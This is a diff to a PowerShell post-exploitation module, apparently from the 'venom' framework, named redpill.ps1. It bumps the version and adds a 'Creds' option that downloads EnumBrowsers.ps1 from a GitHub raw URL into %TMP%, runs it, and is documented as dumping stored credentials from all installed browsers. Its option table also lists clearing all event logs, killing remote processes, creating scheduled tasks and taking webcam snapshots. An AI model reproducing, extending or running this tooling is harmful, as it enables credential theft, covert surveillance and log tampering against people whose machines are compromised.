@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: none
    Optional Dependencies: BitsTransfer
-   PS cmdlet Dev version: v1.2.6
+   PS cmdlet Dev version: v1.2.7
 
 .DESCRIPTION
    This cmdlet belongs to the structure of venom v1.0.17.8 as a post-exploitation module.
@@ -93,7 +93,7 @@
 
 
 ## Var declarations
-$CmdletVersion = "v1.2.6"
+$CmdletVersion = "v1.2.7"
 $Remote_hostName = hostname
 $OsVersion = [System.Environment]::OSVersion.Version
 $Working_Directory = pwd|Select-Object -ExpandProperty Path
@@ -144,7 +144,7 @@ $ListParameters = @"
   -GetProcess       Enum|Kill            Enumerate OR Kill Remote Host Running Process(s)
   -GetTasks         Enum|Create|Delete   Enumerate\Create\Delete Remote Host Running Tasks
   -GetLogs          Enum|Verbose|Clear   Enumerate eventvwr logs OR Clear All event logs
-  -GetBrowsers      Enum|Verbose         Enumerate Installed Browsers and Versions OR Verbose 
+  -GetBrowsers      Enum|Verbose|Creds   Enumerate Installed Browsers and Versions OR Verbose 
   -Screenshot       1                    Capture 1 Desktop Screenshot and Store it on %TMP%
   -Camera           Enum|Snap            Enum computer webcams OR capture default webcam snapshot 
   -StartWebServer   Python|Powershell    Downloads webserver to %TMP% and executes the WebServer.
@@ -324,7 +324,7 @@ If($GetDnsCache -ieq "Enum" -or $GetDnsCache -ieq "Clear"){
    If(Test-Path -Path "$Env:TMP\GetDnsCache.ps1"){Remove-Item -Path "$Env:TMP\GetDnsCache.ps1" -Force}
 }
 
-If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "Verbose"){
+If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "Verbose" -or $GetBrowsers -ieq "Creds"){
 
    <#
    .SYNOPSIS
@@ -336,6 +336,9 @@ If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "Verbose"){
       GitHub repository into remote host %TMP% directory,
       And identify install browsers and run enum modules.
 
+   .Parameter GetBrowsers
+      Accepts Enum, Verbose and Creds @arguments
+
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetBrowsers Enum
       Identify installed browsers and versions
@@ -343,6 +346,10 @@ If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "Verbose"){
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetBrowsers Verbose
       Run enumeration modules againts ALL installed browsers
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -GetBrowsers Creds
+      Dump Stored credentials from all installed browsers
 
    .OUTPUTS
       Browser   Install   Status   Version         PreDefined
@@ -357,7 +364,7 @@ If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "Verbose"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/EnumBrowsers.ps1 -Destination $Env:TMP\EnumBrowsers.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\EnumBrowsers.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,537109375/KB
+      If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,546875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\EnumBrowsers.ps1"){Remove-Item -Path "$Env:TMP\EnumBrowsers.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -369,6 +376,8 @@ If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "Verbose"){
       powershell -File "$Env:TMP\EnumBrowsers.ps1" -GetBrowsers Enum
    }ElseIf($GetBrowsers -ieq "Verbose"){
       powershell -File "$Env:TMP\EnumBrowsers.ps1" -GetBrowsers Verbose
+   }ElseIf($GetBrowsers -ieq "Creds"){
+      powershell -File "$Env:TMP\EnumBrowsers.ps1" -GetBrowsers Creds
    }
 
    ## Clean Old files left behind
@@ -2305,13 +2314,20 @@ $HelpParameters = @"
       GitHub repository into remote host %TMP% directory,
       And identify install browsers and run enum modules.
 
+   .Parameter GetBrowsers
+      Accepts: Enum, Verbose and Creds @arguments.
+
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetBrowsers Enum
-      Identify installed browsers and versions
+      Identify installed browsers and is version numbers
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetBrowsers Verbose
-      Run enumeration modules againts ALL installed browsers
+      Run enumeration modules againts ALL installed browsers found
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -GetBrowsers Creds
+      Dump Stored credentials from ALL installed browsers found
 
    .OUTPUTS
       Browser   Install   Status   Version         PreDefined
